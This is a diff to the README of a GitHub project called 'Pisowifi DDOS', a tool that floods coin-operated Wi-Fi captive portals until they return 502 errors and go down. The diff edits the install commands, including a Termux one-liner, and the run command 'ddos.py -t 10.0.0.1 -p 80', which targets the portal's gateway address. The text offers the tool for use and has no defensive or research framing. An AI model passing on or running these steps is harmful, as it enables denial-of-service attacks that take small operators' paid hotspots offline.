@@ -1,5 +1,5 @@
 # Pisowifi DDOS
-502 Bad Gateway and take down the captive portal.
+10.0.0.1 = 502 Bad Gateway Error
 
 <div align="center">
 <img src="https://github.com/xiv3r/pisowifi-ddos/blob/main/image/proof.png">
@@ -22,7 +22,7 @@ git clone https://github.com/xiv3r/pisowifi-ddos.git
 cd pisowifi-ddos
 ```
 ```
-python3 ddos.py
+python ddos.py
 ```
 
 # Auto Install
@@ -31,10 +31,10 @@ pkg update && pkg upgrade -y && pkg install git python python-pip -y && git clon
 ```
 # Run
 ```
-cd pisowifi-ddos
+cd ~/pisowifi-ddos
 ```
 ```
-python3 ddos.py -t 10.0.0.1 -p 80 -t 135
+python ddos.py -t 10.0.0.1 -p 80 -t 135
 ```
 <div align="center">
 <img src="https://github.com/xiv3r/pisowifi-ddos/blob/main/image/ddos.png">
